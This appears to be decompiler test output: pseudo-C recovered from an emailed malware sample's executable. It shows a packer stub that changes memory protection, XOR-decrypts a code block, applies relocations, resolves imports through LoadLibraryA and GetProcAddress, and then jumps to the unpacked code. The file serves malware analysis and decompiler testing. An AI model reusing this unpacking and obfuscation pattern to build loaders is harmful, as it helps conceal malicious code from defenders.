// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0117/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 edx, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 eax_26 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_16 * esi_15 = null
	Eq_16 * ebx_290 = eax_26 + 0x00000025
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040102A
l00401027:
	ebx_290 = eax_26 + 0x00000003;
l0040102A:
	fp->dwFFFFFFE0 = 0x00000059;
	CloseHandle(0xFFFFFFFF)
	fp->dwFFFFFFE0 = fp - 0x0000000C;
	fp->dwFFFFFFE0 = 0x00000040;
	fp->dwFFFFFFE0 = 0x00003000;
	fp->dwFFFFFFE0 = 0x00401000;
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_66 * eax_59 = null
l00401050:
	branch esi_15 != ebx_290 l00401056
l00401054:
	esi_15 = null;
l00401056:
	byte v14_75 = eax_59->b401278 ^ esi_15->b404000
	eax_59->b401278 = v14_75;
	eax_59 = eax_59 + 1;
	esi_15 = esi_15 + 1;
	branch eax_59 <u (Eq_66 *) 0x00001420 l00401050
l00401072:
	Eq_89 * ecx_116 = &globals->t402558
	up32 dwLoc08_120 = 0x00000000
l00401093:
	word32 eax_97 = ecx_116->dw0004
	Eq_118 * edx_102 = &ecx_116->t0008
	branch eax_97 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010CD
l004010A2:
	uint32 esi_268 = eax_97 - 0x00000008 >>u 0x00000001
l004010A4:
	word32 eax_271 = (word32) edx_102->w0000
	branch (eax_271 & 0x0000F000) != 0x00003000 l004010C5
l004010BA:
	Eq_125 * eax_282 = (eax_271 & 0x00000FFF) + ecx_116->dw0000
	eax_282->dw400FF8 = eax_282->dw400FF8 + 0xF0400FF8;
l004010C5:
	edx_102 = edx_102 + 1;
	esi_268 = esi_268 - 0x00000001;
	branch esi_268 != 0x00000000 l004010A4
l004010CD:
	word32 eax_106 = ecx_116->dw0004
	up32 edx_108 = dwLoc08_120 + eax_106
	Eq_99 * ecx_109 = ecx_116 + eax_106
	branch edx_108 <u 0x000000E4 l00401093
	word32 eax_113 = ecx_109->dw0004
	up32 edx_115 = edx_108 + eax_113
	ecx_116 = ecx_109 + eax_113;
	dwLoc08_120 = edx_115;
	branch edx_115 <u 0x000000E4 l00401093
l004010E4:
	branch globals->dw401D64 == 0x00000000 l00401167
	Eq_153 * esi_127 = &globals->t401D54
	Eq_153 * dwLoc08_128 = &globals->t401D54
	esi_152 = esi_127;
	branch globals->dw401D64 == 0x00000000 l00401167
l004010F7:
	Eq_153 * esi_152
	branch LoadLibraryA(esi_152->dw000C + 0x00400FF8) == 0x00000000 l0040115A
	Eq_176 eax_168 = LoadLibraryA(esi_152->dw000C + 0x00400FF8)
	Eq_176 edi_170 = eax_168
	branch eax_168 == 0x00000000 l0040115A
l0040110D:
	branch esi_152->dw0000 != 0x00000000 l00401116
	word32 ebx_194 = esi_152->dw0000
	branch ebx_194 != 0x00000000 l00401116
l00401113:
	ebx_194 = esi_152->dw0010;
l00401116:
	Eq_208 * ebx_199 = ebx_194 + 0x00400FF8
	Eq_211 eax_202 = ebx_199->t0000
	Eq_215 * esi_203 = esi_152->dw0010 + 0x00400FF8
	byte S_206 = cond(eax_202)
	branch eax_202 == 0x00000000 l00401156
l00401126:
	word32 eax_238
	branch S_206 l0040113C
l00401128:
	eax_238 = GetProcAddress(edi_170, (word32) ebx_199->t0000);
	edi_170 = eax_168;
	goto l00401148
l0040113C:
	eax_238 = GetProcAddress(edi_170, eax_202.u1);
l00401148:
	esi_203->dw0000 = eax_238;
	ebx_199 = ebx_199 + 1;
	eax_202 = ebx_199->t0000;
	esi_203 = esi_203 + 1;
	S_206 = cond(eax_202);
	branch eax_202 != 0x00000000 l00401126
l00401156:
	esi_152 = dwLoc08_128;
l0040115A:
	esi_152 = esi_152 + 1;
	dwLoc08_128 = esi_152;
	branch esi_152->dw0010 != 0x00000000 l004010F7
l00401167:
	0x00401A48()
	ExitProcess(0x00000000)
fn00401000_exit:
}

